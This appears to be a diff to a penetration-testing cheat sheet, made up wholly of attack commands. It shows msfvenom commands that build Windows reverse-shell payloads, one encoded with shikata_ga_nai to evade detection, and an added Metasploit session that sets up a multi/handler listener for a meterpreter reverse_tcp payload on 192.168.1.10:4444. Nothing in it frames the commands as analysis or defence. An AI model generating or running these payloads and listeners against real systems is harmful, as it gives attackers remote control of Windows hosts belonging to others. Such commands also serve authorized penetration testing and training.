@@ -7,3 +7,13 @@ msfvenom -p windows/shell_reverse_tcp -LHOST=<attacker_ip> -LPORT=4444
 
 Windows reverse shell encode
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4545 -f c -e x86/shikata_ga_nai
+
+root@kali:~$ msfconsole
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.1.10
+lhost => 192.168.1.10
+msf exploit(multi/handler) > set lport 4444
+lport => 4444
+msf exploit(multi/handler) > run
